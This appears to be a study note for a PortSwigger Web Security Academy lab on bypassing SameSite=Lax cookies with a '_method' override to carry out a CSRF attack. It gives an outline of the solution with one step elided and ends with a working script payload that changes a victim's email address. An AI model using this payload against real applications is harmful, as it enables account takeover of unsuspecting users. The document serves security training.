# Lab: SameSite Lax bypass via method override

**Official lab:** [Lab: SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

## Lab idea

This challenge explores how browser SameSite=Lax cookie behavior interacts with application request-method handling. It practices assessing whether a state-changing function remains exposed when its method and cookie restrictions are considered together.

## Vulnerability in brief
Cross-site request forgery (CSRF) is a web security vulnerability that tricks a user’s browser into sending an unintended, authenticated request to an application where that user is signed in. The browser may automatically attach session credentials, so the application can mistake the forged request for an action the user chose to perform. CSRF can also arise where browsers automatically supply credentials such as HTTP Basic authentication or client certificates. [Official topic](https://portswigger.net/web-security/csrf)

## Solution idea
1. In Burp's browser, log in to your own account and change your email address.
2. In Burp, go to the Proxy > HTTP history tab.
3. Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass the SameSite cookie…
4. Look at the response to your POST /login request.
- …
6. Store and view the exploit yourself.
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

## Payloads / key values
- `POST /my-account/change-email`
- `POST /login`
- `Lax`
- `GET`
- `POST`
- `_method`
- `GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1`
- `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>`

## Official source
- [PortSwigger Academy: Lab: SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)
